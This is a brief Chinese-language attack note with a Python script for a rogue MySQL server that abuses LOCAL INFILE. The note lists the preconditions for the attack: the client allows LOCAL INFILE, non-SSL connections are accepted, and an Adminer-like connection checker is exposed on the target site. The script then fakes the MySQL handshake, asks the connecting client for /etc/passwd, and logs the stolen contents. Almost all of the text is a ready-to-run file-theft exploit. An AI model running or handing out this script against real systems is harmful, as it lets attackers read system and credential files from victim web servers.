	https://github.com/Gifts/Rogue-MySql-Server
	客户端必须启用LOCAL-INFILE 
	客户端支持非SSL连接
	目标web存在adminer等可检查数据库连接的脚本。
	攻击机本地运行python构造假mysql服务，使用目标web连接，读取文件。
	#coding=utf-8 
	import socket
	import logging
	logging.basicConfig(level=logging.DEBUG)
	filename="/etc/passwd"
	sv=socket.socket()
	sv.bind(("",3305))
	sv.listen(5)
	conn,address=sv.accept()
	logging.info('Conn from: %r', address)
	conn.sendall("\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00")
	conn.recv(9999)
	logging.info("auth okay")
	conn.sendall("\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00")
	conn.recv(9999)
	logging.info("want file...")
	wantfile=chr(len(filename)+1)+"\x00\x00\x01\xFB"+filename
	conn.sendall(wantfile)
	content=conn.recv(9999)
	logging.info(content)
	conn.close()
